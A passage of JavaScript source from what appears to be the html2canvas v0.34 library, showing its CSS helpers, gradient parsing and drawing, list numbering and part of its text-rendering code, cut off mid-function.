/**
  @license html2canvas v0.34 <http://html2canvas.hertzen.com>
  Copyright (c) 2011 Niklas von Hertzen. All rights reserved.
  http://www.twitter.com/niklasvh

  Released under MIT License
 */
(function(window, document, undefined){

/*
  html2canvas v0.34 <http://html2canvas.hertzen.com>
  Copyright (c) 2011 Niklas von Hertzen. All rights reserved.
  http://www.twitter.com/niklasvh

  Released under MIT License
 */
"use strict";

var _html2canvas = {},
previousElement,
computedCSS,
html2canvas;


function h2clog(a) {
    if (_html2canvas.logging && window.console && window.console.log) {
        window.console.log(a);
    }
}

_html2canvas.Util = {};

_html2canvas.Util.backgroundImage = function (src) {

    if (/data:image\/.*;base64,/i.test( src ) || /^(-webkit|-moz|linear-gradient|-o-)/.test( src )) {
        return src;
    }

    if (src.toLowerCase().substr( 0, 5 ) === 'url("') {
        src = src.substr( 5 );
        src = src.substr( 0, src.length - 2 );
    } else {
        src = src.substr( 4 );
        src = src.substr( 0, src.length - 1 );
    }

    return src;
};

_html2canvas.Util.Bounds = function getBounds (el) {
    var clientRect,
    bounds = {};

    if (el.getBoundingClientRect){
        clientRect = el.getBoundingClientRect();


        // TODO add scroll position to bounds, so no scrolling of window necessary
        bounds.top = clientRect.top;
        bounds.bottom = clientRect.bottom || (clientRect.top + clientRect.height);
        bounds.left = clientRect.left;

        // older IE doesn't have width/height, but top/bottom instead
        bounds.width = clientRect.width || (clientRect.right - clientRect.left);
        bounds.height = clientRect.height || (clientRect.bottom - clientRect.top);

        return bounds;

    }
};

_html2canvas.Util.getCSS = function (el, attribute) {
    // return $(el).css(attribute);

    var val;

    function toPX( attribute, val ) {
        var rsLeft = el.runtimeStyle && el.runtimeStyle[ attribute ],
        left,
        style = el.style;

        // Check if we are not dealing with pixels, (Opera has issues with this)
        // Ported from jQuery css.js
        // From the awesome hack by Dean Edwards
        // http://erik.eae.net/archives/2007/07/27/18.54.15/#comment-102291

        // If we're not dealing with a regular pixel number
        // but a number that has a weird ending, we need to convert it to pixels

        if ( !/^-?[0-9]+\.?[0-9]*(?:px)?$/i.test( val ) && /^-?\d/.test( val ) ) {

            // Remember the original values
            left = style.left;

            // Put in the new values to get a computed value out
            if ( rsLeft ) {
                el.runtimeStyle.left = el.currentStyle.left;
            }
            style.left = attribute === "fontSize" ? "1em" : (val || 0);
            val = style.pixelLeft + "px";

            // Revert the changed values
            style.left = left;
            if ( rsLeft ) {
                el.runtimeStyle.left = rsLeft;
            }

        }

        if (!/^(thin|medium|thick)$/i.test( val )) {
            return Math.round(parseFloat( val )) + "px";
        }

        return val;

    }


    if ( window.getComputedStyle ) {
        if ( previousElement !== el ) {
            computedCSS = document.defaultView.getComputedStyle(el, null);
        }
        val = computedCSS[ attribute ];

        if ( attribute === "backgroundPosition" ) {

            val = (val.split(",")[0] || "0 0").split(" ");

            val[ 0 ] = ( val[0].indexOf( "%" ) === -1 ) ? toPX(  attribute + "X", val[ 0 ] ) : val[ 0 ];
            val[ 1 ] = ( val[1] === undefined ) ? val[0] : val[1]; // IE 9 doesn't return double digit always
            val[ 1 ] = ( val[1].indexOf( "%" ) === -1 ) ? toPX(  attribute + "Y", val[ 1 ] ) : val[ 1 ];
        }

    } else if ( el.currentStyle ) {
        // IE 9>
        if (attribute === "backgroundPosition") {
            // Older IE uses -x and -y
            val = [ toPX(  attribute + "X", el.currentStyle[ attribute + "X" ]  ), toPX(  attribute + "Y", el.currentStyle[ attribute + "Y" ]  ) ];
        } else {

            val = toPX(  attribute, el.currentStyle[ attribute ]  );

            if (/^(border)/i.test( attribute ) && /^(medium|thin|thick)$/i.test( val )) {
                switch (val) {
                    case "thin":
                        val = "1px";
                        break;
                    case "medium":
                        val = "0px"; // this is wrong, it should be 3px but IE uses medium for no border as well.. TODO find a work around
                        break;
                    case "thick":
                        val = "5px";
                        break;
                }
            }
        }



    }




    return val;



//return $(el).css(attribute);


};


_html2canvas.Util.BackgroundPosition = function ( el, bounds, image ) {
    // TODO add support for multi image backgrounds

    var bgposition =  _html2canvas.Util.getCSS( el, "backgroundPosition" ) ,
    topPos,
    left,
    percentage,
    val;

    if (bgposition.length === 1){
        val = bgposition;

        bgposition = [];

        bgposition[0] = val;
        bgposition[1] = val;
    }



    if (bgposition[0].toString().indexOf("%") !== -1){
        percentage = (parseFloat(bgposition[0])/100);
        left =  ((bounds.width * percentage)-(image.width*percentage));

    }else{
        left = parseInt(bgposition[0],10);
    }

    if (bgposition[1].toString().indexOf("%") !== -1){

        percentage = (parseFloat(bgposition[1])/100);
        topPos =  ((bounds.height * percentage)-(image.height*percentage));
    }else{
        topPos = parseInt(bgposition[1],10);
    }




    return {
        top: topPos,
        left: left
    };

};

_html2canvas.Util.Extend = function (options, defaults) {
    for (var key in options) {
        if (options.hasOwnProperty(key)) {
            defaults[key] = options[key];
        }
    }
    return defaults;
};


/*
 * Derived from jQuery.contents()
 * Copyright 2010, John Resig
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 */
_html2canvas.Util.Children = function( elem ) {


    var children;
    try {

        children = (elem.nodeName && elem.nodeName.toUpperCase() === "IFRAME") ?
        elem.contentDocument || elem.contentWindow.document : (function( array ){
            var ret = [];

            if ( array !== null ) {

                (function( first, second ) {
                    var i = first.length,
                    j = 0;

                    if ( typeof second.length === "number" ) {
                        for ( var l = second.length; j < l; j++ ) {
                            first[ i++ ] = second[ j ];
                        }

                    } else {
                        while ( second[j] !== undefined ) {
                            first[ i++ ] = second[ j++ ];
                        }
                    }

                    first.length = i;

                    return first;
                })( ret, array );

            }

            return ret;
        })( elem.childNodes );

    } catch (ex) {
        h2clog("html2canvas.Util.Children failed with exception: " + ex.message);
        children = [];
    }
    return children;
};

/*
  html2canvas v0.34 <http://html2canvas.hertzen.com>
  Copyright (c) 2011 Niklas von Hertzen. All rights reserved.
  http://www.twitter.com/niklasvh

  Contributor(s):
      Niklas von Hertzen <http://www.twitter.com/niklasvh>
      André Fiedler      <http://www.twitter.com/sonnenkiste>

  Released under MIT License
 */

(function(){

_html2canvas.Generate = {};

var reGradients = [
    /^(-webkit-linear-gradient)\(([a-z\s]+)([\w\d\.\s,%\(\)]+)\)$/,
    /^(-o-linear-gradient)\(([a-z\s]+)([\w\d\.\s,%\(\)]+)\)$/,
    /^(-webkit-gradient)\((linear|radial),\s((?:\d{1,3}%?)\s(?:\d{1,3}%?),\s(?:\d{1,3}%?)\s(?:\d{1,3}%?))([\w\d\.\s,%\(\)-]+)\)$/,
    /^(-moz-linear-gradient)\(((?:\d{1,3}%?)\s(?:\d{1,3}%?))([\w\d\.\s,%\(\)]+)\)$/,
    /^(-webkit-radial-gradient)\(((?:\d{1,3}%?)\s(?:\d{1,3}%?)),\s(\w+)\s([a-z-]+)([\w\d\.\s,%\(\)]+)\)$/,
    /^(-moz-radial-gradient)\(((?:\d{1,3}%?)\s(?:\d{1,3}%?)),\s(\w+)\s?([a-z-]*)([\w\d\.\s,%\(\)]+)\)$/,
    /^(-o-radial-gradient)\(((?:\d{1,3}%?)\s(?:\d{1,3}%?)),\s(\w+)\s([a-z-]+)([\w\d\.\s,%\(\)]+)\)$/
];

/*
 * TODO: Add IE10 vendor prefix (-ms) support
 * TODO: Add W3C gradient (linear-gradient) support
 * TODO: Add old Webkit -webkit-gradient(radial, ...) support
 * TODO: Maybe some RegExp optimizations are possible ;o)
 */
_html2canvas.Generate.parseGradient = function(css, bounds) {
    var gradient, i, len = reGradients.length, m1, stop, m2, m2Len, step, m3;

    for(i = 0; i < len; i+=1){
        m1 = css.match(reGradients[i]);
        if(m1) break;
    }

    if(m1) {
        switch(m1[1]) {
            case '-webkit-linear-gradient':
            case '-o-linear-gradient':

                gradient = {
                    type: 'linear',
                    x0: null,
                    y0: null,
                    x1: null,
                    y1: null,
                    colorStops: []
                };

                // get coordinates
                m2 = m1[2].match(/\w+/g);
                if(m2){
                    m2Len = m2.length;
                    for(i = 0; i < m2Len; i+=1){
                        switch(m2[i]) {
                            case 'top':
                                gradient.y0 = 0;
                                gradient.y1 = bounds.height;
                                break;

                            case 'right':
                                gradient.x0 = bounds.width;
                                gradient.x1 = 0;
                                break;

                            case 'bottom':
                                gradient.y0 = bounds.height;
                                gradient.y1 = 0;
                                break;

                            case 'left':
                                gradient.x0 = 0;
                                gradient.x1 = bounds.width;
                                break;
                        }
                    }
                }
                if(gradient.x0 === null && gradient.x1 === null){ // center
                    gradient.x0 = gradient.x1 = bounds.width / 2;
                }
                if(gradient.y0 === null && gradient.y1 === null){ // center
                    gradient.y0 = gradient.y1 = bounds.height / 2;
                }

                // get colors and stops
                m2 = m1[3].match(/((?:rgb|rgba)\(\d{1,3},\s\d{1,3},\s\d{1,3}(?:,\s[0-9\.]+)?\)(?:\s\d{1,3}(?:%|px))?)+/g);
                if(m2){
                    m2Len = m2.length;
                    step = 1 / Math.max(m2Len - 1, 1);
                    for(i = 0; i < m2Len; i+=1){
                        m3 = m2[i].match(/((?:rgb|rgba)\(\d{1,3},\s\d{1,3},\s\d{1,3}(?:,\s[0-9\.]+)?\))\s*(\d{1,3})?(%|px)?/);
                        if(m3[2]){
                            stop = parseFloat(m3[2]);
                            if(m3[3] === '%'){
                                stop /= 100;
                            } else { // px - stupid opera
                                stop /= bounds.width;
                            }
                        } else {
                            stop = i * step;
                        }
                        gradient.colorStops.push({
                            color: m3[1],
                            stop: stop
                        });
                    }
                }
                break;

            case '-webkit-gradient':

                gradient = {
                    type: m1[2] === 'radial' ? 'circle' : m1[2], // TODO: Add radial gradient support for older mozilla definitions
                    x0: 0,
                    y0: 0,
                    x1: 0,
                    y1: 0,
                    colorStops: []
                };

                // get coordinates
                m2 = m1[3].match(/(\d{1,3})%?\s(\d{1,3})%?,\s(\d{1,3})%?\s(\d{1,3})%?/);
                if(m2){
                    gradient.x0 = (m2[1] * bounds.width) / 100;
                    gradient.y0 = (m2[2] * bounds.height) / 100;
                    gradient.x1 = (m2[3] * bounds.width) / 100;
                    gradient.y1 = (m2[4] * bounds.height) / 100;
                }

                // get colors and stops
                m2 = m1[4].match(/((?:from|to|color-stop)\((?:[0-9\.]+,\s)?(?:rgb|rgba)\(\d{1,3},\s\d{1,3},\s\d{1,3}(?:,\s[0-9\.]+)?\)\))+/g);
                if(m2){
                    m2Len = m2.length;
                    for(i = 0; i < m2Len; i+=1){
                        m3 = m2[i].match(/(from|to|color-stop)\(([0-9\.]+)?(?:,\s)?((?:rgb|rgba)\(\d{1,3},\s\d{1,3},\s\d{1,3}(?:,\s[0-9\.]+)?\))\)/);
                        stop = parseFloat(m3[2]);
                        if(m3[1] === 'from') stop = 0.0;
                        if(m3[1] === 'to') stop = 1.0;
                        gradient.colorStops.push({
                            color: m3[3],
                            stop: stop
                        });
                    }
                }
                break;

            case '-moz-linear-gradient':

                gradient = {
                    type: 'linear',
                    x0: 0,
                    y0: 0,
                    x1: 0,
                    y1: 0,
                    colorStops: []
                };

                // get coordinates
                m2 = m1[2].match(/(\d{1,3})%?\s(\d{1,3})%?/);

                // m2[1] == 0%   -> left
                // m2[1] == 50%  -> center
                // m2[1] == 100% -> right

                // m2[2] == 0%   -> top
                // m2[2] == 50%  -> center
                // m2[2] == 100% -> bottom

                if(m2){
                    gradient.x0 = (m2[1] * bounds.width) / 100;
                    gradient.y0 = (m2[2] * bounds.height) / 100;
                    gradient.x1 = bounds.width - gradient.x0;
                    gradient.y1 = bounds.height - gradient.y0;
                }

                // get colors and stops
                m2 = m1[3].match(/((?:rgb|rgba)\(\d{1,3},\s\d{1,3},\s\d{1,3}(?:,\s[0-9\.]+)?\)(?:\s\d{1,3}%)?)+/g);
                if(m2){
                    m2Len = m2.length;
                    step = 1 / Math.max(m2Len - 1, 1);
                    for(i = 0; i < m2Len; i+=1){
                        m3 = m2[i].match(/((?:rgb|rgba)\(\d{1,3},\s\d{1,3},\s\d{1,3}(?:,\s[0-9\.]+)?\))\s*(\d{1,3})?(%)?/);
                        if(m3[2]){
                            stop = parseFloat(m3[2]);
                            if(m3[3]){ // percentage
                                stop /= 100;
                            }
                        } else {
                            stop = i * step;
                        }
                        gradient.colorStops.push({
                            color: m3[1],
                            stop: stop
                        });
                    }
                }
                break;

            case '-webkit-radial-gradient':
            case '-moz-radial-gradient':
            case '-o-radial-gradient':

                gradient = {
                    type: 'circle',
                    x0: 0,
                    y0: 0,
                    x1: bounds.width,
                    y1: bounds.height,
                    cx: 0,
                    cy: 0,
                    rx: 0,
                    ry: 0,
                    colorStops: []
                };

                // center
                m2 = m1[2].match(/(\d{1,3})%?\s(\d{1,3})%?/);
                if(m2){
                    gradient.cx = (m2[1] * bounds.width) / 100;
                    gradient.cy = (m2[2] * bounds.height) / 100;
                }

                // size
                m2 = m1[3].match(/\w+/);
                m3 = m1[4].match(/[a-z-]*/);
                if(m2 && m3){
                    switch(m3[0]){
                        case 'farthest-corner':
                        case 'cover': // is equivalent to farthest-corner
                        case '': // mozilla removes "cover" from definition :(
                            var tl = Math.sqrt(Math.pow(gradient.cx, 2) + Math.pow(gradient.cy, 2));
                            var tr = Math.sqrt(Math.pow(gradient.cx, 2) + Math.pow(gradient.y1 - gradient.cy, 2));
                            var br = Math.sqrt(Math.pow(gradient.x1 - gradient.cx, 2) + Math.pow(gradient.y1 - gradient.cy, 2));
                            var bl = Math.sqrt(Math.pow(gradient.x1 - gradient.cx, 2) + Math.pow(gradient.cy, 2));
                            gradient.rx = gradient.ry = Math.max(tl, tr, br, bl);
                            break;
                        case 'closest-corner':
                            var tl = Math.sqrt(Math.pow(gradient.cx, 2) + Math.pow(gradient.cy, 2));
                            var tr = Math.sqrt(Math.pow(gradient.cx, 2) + Math.pow(gradient.y1 - gradient.cy, 2));
                            var br = Math.sqrt(Math.pow(gradient.x1 - gradient.cx, 2) + Math.pow(gradient.y1 - gradient.cy, 2));
                            var bl = Math.sqrt(Math.pow(gradient.x1 - gradient.cx, 2) + Math.pow(gradient.cy, 2));
                            gradient.rx = gradient.ry = Math.min(tl, tr, br, bl);
                            break;
                        case 'farthest-side':
                            if(m2[0] === 'circle'){
                                gradient.rx = gradient.ry = Math.max(
                                    gradient.cx,
                                    gradient.cy,
                                    gradient.x1 - gradient.cx,
                                    gradient.y1 - gradient.cy
                                );
                            } else { // ellipse

                                gradient.type = m2[0];

                                gradient.rx = Math.max(
                                    gradient.cx,
                                    gradient.x1 - gradient.cx
                                );
                                gradient.ry = Math.max(
                                    gradient.cy,
                                    gradient.y1 - gradient.cy
                                );
                            }
                            break;
                        case 'closest-side':
                        case 'contain': // is equivalent to closest-side
                            if(m2[0] === 'circle'){
                                gradient.rx = gradient.ry = Math.min(
                                    gradient.cx,
                                    gradient.cy,
                                    gradient.x1 - gradient.cx,
                                    gradient.y1 - gradient.cy
                                );
                            } else { // ellipse

                                gradient.type = m2[0];

                                gradient.rx = Math.min(
                                    gradient.cx,
                                    gradient.x1 - gradient.cx
                                );
                                gradient.ry = Math.min(
                                    gradient.cy,
                                    gradient.y1 - gradient.cy
                                );
                            }
                            break;

                        // TODO: add support for "30px 40px" sizes (webkit only)
                    }
                }

                // color stops
                m2 = m1[5].match(/((?:rgb|rgba)\(\d{1,3},\s\d{1,3},\s\d{1,3}(?:,\s[0-9\.]+)?\)(?:\s\d{1,3}(?:%|px))?)+/g);
                if(m2){
                    m2Len = m2.length;
                    step = 1 / Math.max(m2Len - 1, 1);
                    for(i = 0; i < m2Len; i+=1){
                        m3 = m2[i].match(/((?:rgb|rgba)\(\d{1,3},\s\d{1,3},\s\d{1,3}(?:,\s[0-9\.]+)?\))\s*(\d{1,3})?(%|px)?/);
                        if(m3[2]){
                            stop = parseFloat(m3[2]);
                            if(m3[3] === '%'){
                                stop /= 100;
                            } else { // px - stupid opera
                                stop /= bounds.width;
                            }
                        } else {
                            stop = i * step;
                        }
                        gradient.colorStops.push({
                            color: m3[1],
                            stop: stop
                        });
                    }
                }
                break;
        }
    }

    return gradient;
};

_html2canvas.Generate.Gradient = function(src, bounds) {
    var canvas = document.createElement('canvas'),
    ctx = canvas.getContext('2d'),
    gradient, grad, i, len, img;

    canvas.width = bounds.width;
    canvas.height = bounds.height;

    // TODO: add support for multi defined background gradients (like radial gradient example in background.html)
    gradient = _html2canvas.Generate.parseGradient(src, bounds);

    img = new Image();

    if(gradient){
        if(gradient.type === 'linear'){
            grad = ctx.createLinearGradient(gradient.x0, gradient.y0, gradient.x1, gradient.y1);

            for (i = 0, len = gradient.colorStops.length; i < len; i+=1) {
                try {
                    grad.addColorStop(gradient.colorStops[i].stop, gradient.colorStops[i].color);
                }
                catch(e) {
                    h2clog(['failed to add color stop: ', e, '; tried to add: ', gradient.colorStops[i], '; stop: ', i, '; in: ', src]);
                }
            }

            ctx.fillStyle = grad;
            ctx.fillRect(0, 0, bounds.width, bounds.height);

            img.src = canvas.toDataURL();
        } else if(gradient.type === 'circle'){

            grad = ctx.createRadialGradient(gradient.cx, gradient.cy, 0, gradient.cx, gradient.cy, gradient.rx);

            for (i = 0, len = gradient.colorStops.length; i < len; i+=1) {
                try {
                    grad.addColorStop(gradient.colorStops[i].stop, gradient.colorStops[i].color);
                }
                catch(e) {
                    h2clog(['failed to add color stop: ', e, '; tried to add: ', gradient.colorStops[i], '; stop: ', i, '; in: ', src]);
                }
            }

            ctx.fillStyle = grad;
            ctx.fillRect(0, 0, bounds.width, bounds.height);

            img.src = canvas.toDataURL();
        } else if(gradient.type === 'ellipse'){

            // draw circle
            var canvasRadial = document.createElement('canvas'),
                ctxRadial = canvasRadial.getContext('2d'),
                ri = Math.max(gradient.rx, gradient.ry),
                di = ri * 2, imgRadial;

            canvasRadial.width = canvasRadial.height = di;

            grad = ctxRadial.createRadialGradient(gradient.rx, gradient.ry, 0, gradient.rx, gradient.ry, ri);

            for (i = 0, len = gradient.colorStops.length; i < len; i+=1) {
                try {
                    grad.addColorStop(gradient.colorStops[i].stop, gradient.colorStops[i].color);
                }
                catch(e) {
                    h2clog(['failed to add color stop: ', e, '; tried to add: ', gradient.colorStops[i], '; stop: ', i, '; in: ', src]);
                }
            }

            ctxRadial.fillStyle = grad;
            ctxRadial.fillRect(0, 0, di, di);

            ctx.fillStyle = gradient.colorStops[i - 1].color;
            ctx.fillRect(0, 0, canvas.width, canvas.height);

            imgRadial = new Image();
            imgRadial.onload = function() { // wait until the image is filled

                // transform circle to ellipse
                ctx.drawImage(imgRadial, gradient.cx - gradient.rx, gradient.cy - gradient.ry, 2 * gradient.rx, 2 * gradient.ry);

                img.src = canvas.toDataURL();

            }
            imgRadial.src = canvasRadial.toDataURL();
        }
    }

    return img;
};

_html2canvas.Generate.ListAlpha = function(number) {
    var tmp = "",
    modulus;

    do {
        modulus = number % 26;
        tmp = String.fromCharCode((modulus) + 64) + tmp;
        number = number / 26;
    }while((number*26) > 26);

    return tmp;
};

_html2canvas.Generate.ListRoman = function(number) {
    var romanArray = ["M", "CM", "D", "CD", "C", "XC", "L", "XL", "X", "IX", "V", "IV", "I"],
    decimal = [1000, 900, 500, 400, 100, 90, 50, 40, 10, 9, 5, 4, 1],
    roman = "",
    v,
    len = romanArray.length;

    if (number <= 0 || number >= 4000) {
        return number;
    }

    for (v=0; v < len; v+=1) {
        while (number >= decimal[v]) {
            number -= decimal[v];
            roman += romanArray[v];
        }
    }

    return roman;

};

})();
/*
  html2canvas v0.34 <http://html2canvas.hertzen.com>
  Copyright (c) 2011 Niklas von Hertzen. All rights reserved.
  http://www.twitter.com/niklasvh

  Released under MIT License
*/

/*
 *  New function for traversing elements
 */

_html2canvas.Parse = function ( images, options ) {
    window.scroll(0,0);

    var support = {
        rangeBounds: false,
        svgRendering: options.svgRendering && (function( ){
            var img = new Image(),
            canvas = document.createElement("canvas"),
            ctx = (canvas.getContext === undefined) ? false : canvas.getContext("2d");
            if (ctx === false) {
                // browser doesn't support canvas, good luck supporting SVG on canvas
                return false;
            }
            canvas.width = canvas.height = 10;
            img.src = [
            "data:image/svg+xml,",
            "<svg xmlns='http://www.w3.org/2000/svg' width='10' height='10'>",
            "<foreignObject width='10' height='10'>",
            "<div xmlns='http://www.w3.org/1999/xhtml' style='width:10;height:10;'>",
            "sup",
            "</div>",
            "</foreignObject>",
            "</svg>"
            ].join("");
            try {
                ctx.drawImage(img, 0, 0);
                canvas.toDataURL();
            } catch(e) {
                return false;
            }
            h2clog('html2canvas: Parse: SVG powered rendering available');
            return true;

        })()
    },
    element = (( options.elements === undefined ) ? document.body : options.elements[0]), // select body by default
    needReorder = false,
    numDraws = 0,
    fontData = {},
    doc = element.ownerDocument,
    ignoreElementsRegExp = new RegExp("(" + options.ignoreElements + ")"),
    body = doc.body,
    r,
    testElement,
    rangeBounds,
    rangeHeight,
    stack,
    ctx,
    docDim,
    i,
    children,
    childrenLen;


    function docSize(){

        return {
            width: Math.max(
                Math.max(doc.body.scrollWidth, doc.documentElement.scrollWidth),
                Math.max(doc.body.offsetWidth, doc.documentElement.offsetWidth),
                Math.max(doc.body.clientWidth, doc.documentElement.clientWidth)
                ),
            height: Math.max(
                Math.max(doc.body.scrollHeight, doc.documentElement.scrollHeight),
                Math.max(doc.body.offsetHeight, doc.documentElement.offsetHeight),
                Math.max(doc.body.clientHeight, doc.documentElement.clientHeight)
                )
        };

    }

    images = images || {};

    // Test whether we can use ranges to measure bounding boxes
    // Opera doesn't provide valid bounds.height/bottom even though it supports the method.


    if (doc.createRange) {
        r = doc.createRange();
        //this.support.rangeBounds = new Boolean(r.getBoundingClientRect);
        if (r.getBoundingClientRect){
            testElement = doc.createElement('boundtest');
            testElement.style.height = "123px";
            testElement.style.display = "block";
            body.appendChild(testElement);

            r.selectNode(testElement);
            rangeBounds = r.getBoundingClientRect();
            rangeHeight = rangeBounds.height;

            if (rangeHeight === 123) {
                support.rangeBounds = true;
            }
            body.removeChild(testElement);


        }

    }


    /*
    var rootStack = new this.storageContext($(document).width(),$(document).height());
    rootStack.opacity = this.getCSS(this.element,"opacity");
    var stack = this.newElement(this.element,rootStack);


    this.parseElement(this.element,stack);
     */




    var getCSS = _html2canvas.Util.getCSS;
    function getCSSInt(element, attribute) {
        var val = parseInt(getCSS(element, attribute), 10);
        return (isNaN(val)) ? 0 : val; // borders in old IE are throwing 'medium' for demo.html
    }

    // Drawing a rectangle
    function renderRect (ctx, x, y, w, h, bgcolor) {
        if (bgcolor !=="transparent"){
            ctx.setVariable("fillStyle", bgcolor);
            ctx.fillRect (x, y, w, h);
            numDraws+=1;
        }
    }


    function textTransform (text, transform) {
        switch(transform){
            case "lowercase":
                return text.toLowerCase();

            case "capitalize":
                return text.replace( /(^|\s|:|-|\(|\))([a-z])/g , function (m, p1, p2) {
                    if (m.length > 0) {
                        return p1 + p2.toUpperCase();
                    }
                } );

            case "uppercase":
                return text.toUpperCase();

            default:
                return text;

        }

    }

    function trimText (text) {
        return text.replace(/^\s*/g, "").replace(/\s*$/g, "");
    }

    function fontMetrics (font, fontSize) {

        if (fontData[font + "-" + fontSize] !== undefined) {
            return fontData[font + "-" + fontSize];
        }


        var container = doc.createElement('div'),
        img = doc.createElement('img'),
        span = doc.createElement('span'),
        baseline,
        middle,
        metricsObj;


        container.style.visibility = "hidden";
        container.style.fontFamily = font;
        container.style.fontSize = fontSize;
        container.style.margin = 0;
        container.style.padding = 0;

        body.appendChild(container);



        // http://probablyprogramming.com/2009/03/15/the-tiniest-gif-ever (handtinywhite.gif)
        img.src = "data:image/gif;base64,R0lGODlhAQABAIABAP///wAAACwAAAAAAQABAAACAkQBADs=";
        img.width = 1;
        img.height = 1;

        img.style.margin = 0;
        img.style.padding = 0;
        img.style.verticalAlign = "baseline";

        span.style.fontFamily = font;
        span.style.fontSize = fontSize;
        span.style.margin = 0;
        span.style.padding = 0;




        span.appendChild(doc.createTextNode('Hidden Text'));
        container.appendChild(span);
        container.appendChild(img);
        baseline = (img.offsetTop - span.offsetTop) + 1;

        container.removeChild(span);
        container.appendChild(doc.createTextNode('Hidden Text'));

        container.style.lineHeight = "normal";
        img.style.verticalAlign = "super";

        middle = (img.offsetTop-container.offsetTop) + 1;
        metricsObj = {
            baseline: baseline,
            lineWidth: 1,
            middle: middle
        };


        fontData[font + "-" + fontSize] = metricsObj;

        body.removeChild(container);

        return metricsObj;

    }


    function drawText(currentText, x, y, ctx){
        if (trimText(currentText).length>0) {
            ctx.fillText(currentText,x,y);
            numDraws+=1;
        }
    }


    function renderText(el, textNode, stack) {
        var ctx = stack.ctx,
        family = getCSS(el, "fontFamily"),
        size = getCSS(el, "fontSize"),
        color = getCSS(el, "color"),
        text_decoration = getCSS(el, "textDecoration"),
        text_align = getCSS(el, "textAlign"),
        letter_spacing = getCSS(el, "letterSpacing"),
        bounds,
        text,
        metrics,
        renderList,
        listLen,
        bold = getCSS(el, "fontWeight"),
        font_style = getCSS(el, "fontStyle"),
        font_variant = getCSS(el, "fontVariant"),
        align = false,
        newTextNode,
        textValue,
        textOffset = 0,
        oldTextNode,
        c,
        range,
        parent,
        wrapElement,
        backupText;

        // apply text-transform:ation to the text



        textNode.nodeValue = textTransform(textNode.nodeValue, getCSS(el, "textTransform"));
        text = trimText(textNode.nodeValue);

        if (text.length>0){

            if (text_decoration !== "none"){
                metrics = fontMetrics(family, size);
            }

            text_align = text_align.replace(["-webkit-auto"],["auto"]);

            if (options.letterRendering === false && /^(left|right|justify|auto)$/.test(text_align) && /^(normal|none)$/.test(letter_spacing)){
                // this.setContextVariable(ctx,"textAlign",text_align);
                renderList = textNode.nodeValue.split(/(\b| )/);

            }else{
                //  this.setContextVariable(ctx,"textAlign","left");
                renderList = textNode.nodeValue.split("");
            }

            switch(parseInt(bold, 10)){
                case 401:
                    bold = "bold";
                    break;
                case 400:
                    bold = "normal";
                    break;
            }

            ctx.setVariable("fillStyle", color);

            /*
              need to be defined in the order as defined in http://www.w3.org/TR/CSS21/fonts.html#font-shorthand
              to properly work in Firefox
            */
            ctx.setVariable("font", font_style+ " " + font_variant  + " " + bold + " " + size + " " + family);

            if (align){
                ctx.setVariable("textAlign", "right");
            }else{
                ctx.setVariable("textAlign", "left");
            }


            /*
        if (stack.clip){
        ctx.rect (stack.clip.left, stack.clip.top, stack.clip.width, stack.clip.height);
        ctx.clip();
        }
             */


            oldTextNode = textNode;


            for ( c=0, listLen = renderList.length; c < listLen; c+=1 ) {
                textValue = null;



                if (support.rangeBounds){
                    // getBoundingClientRect is supported for ranges
                    if (text_decoration !== "none" || trimText(renderList[c]).length !== 0) {
                        textValue = renderList[c];
                        if (doc.createRange){
                            range = doc.createRange();

                            range.setStart(textNode, textOffset);
                            range.setEnd(textNode, textOffset + textValue.length);
                        }else{
                            // TODO add IE support
                            range = body.createTextRange();
                        }

                        if (range.getBoundingClientRect()) {
                            bounds = range.getBoundingClientRect();
                        }else{
                            bounds = {};
                        }

                    }
                }else{
                    // it isn't supported, so let's wrap it inside an element instead and get the bounds there

                    // IE 9 bug
                    if (typeof oldTextNode.nodeValue !== "string" ){
                        continue;
                    }

                    newTextNode = oldTextNode.splitText(renderList[c].length);

                    parent = oldTextNode.parentNode;
                    wrapElement = doc.createElement('wrapper');
                    backupText = oldTextNode.cloneNode(true);

                    wrapElement.appendChild(oldTextNode.cloneNode(true));
                    parent.replaceChild(wrapElement, oldTextNode);

                    bounds = _html2canvas.Util.Bounds(wrapElement);

                    textValue = oldTextNode.nodeValue;

                    oldTextNode = newTextNode;
                    parent.replaceChild(backupText, wrapElement);


                }

                if (textValue !== null){
                    drawText(textValue, bounds.left, bounds.bottom, ctx);
                }

                switch(text_decoration) {
                    case "underline":
                        // Draws a line at the baseline of the font
                        // TODO As some browsers display the line as more than 1px if the font-size is big, need to take that into account both in position and size
                        renderRect(ctx, bounds.left, Math.round(bounds.top + metrics.baseline + metrics.lineWidth), bounds.width, 1, color);
                        break;
                    case "overline":
                        renderRect(ctx, bounds.left, bounds.top, bounds.width, 1, color);
                        break;
                    case "line-through":
                        // TODO try and find exact position for line-through
                        renderRect(ctx, bounds.left, Math.ceil(bounds.top + metrics.middle + metrics.lineWidth), bounds.width, 1, color);
                        break;

                }





                textOffset += renderList[c].length;

            }



        }

    }

    function listPosition (element, val) {
        var boundElement = doc.createElement( "boundelement" ),
        type,
        bounds;

        boundElement.style.display = "inline";
        //boundElement.style.width = "1px";
        //boundElement.style.height = "1px";

        type = element.style.listStyleType;
        element.style.listStyleType = "none";

        boundElement.appendChild( doc.createTextNode( val ) );


        element.insertBefore(boundElement, element.firstChild);


        bounds = _html2canvas.Util.Bounds( boundElement );
        element.removeChild( boundElement );
        element.style.listStyleType = type;
        return bounds;

    }
    

    
    function elementIndex( el ) {
        var i = -1,
        count = 1,
        childs = el.parentNode.childNodes;

        if ( el.parentNode ) {
            while( childs[ ++i ] !== el ) {
               if ( childs[ i ].nodeType === 1 ) {
                   count++;
               }
            }
            return count;
        } else {
            return -1;
        }
       
    }

    function renderListItem(element, stack, elBounds) {


        var position = getCSS(element, "listStylePosition"),
        x,
        y,
        type = getCSS(element, "listStyleType"),
        currentIndex,
        text,
        listBounds,
        bold = getCSS(element, "fontWeight");

        if (/^(decimal|decimal-leading-zero|upper-alpha|upper-latin|upper-roman|lower-alpha|lower-greek|lower-latin|lower-roman)$/i.test(type)) {

            currentIndex = elementIndex( element );

            switch(type){
                case "decimal":
                    text = currentIndex;
                    break;
                case "decimal-leading-zero":
                    if (currentIndex.toString().length === 1){
                        text = currentIndex = "0" + currentIndex.toString();
                    }else{
                        text = currentIndex.toString();
                    }
                    break;
                case "upper-roman":
            
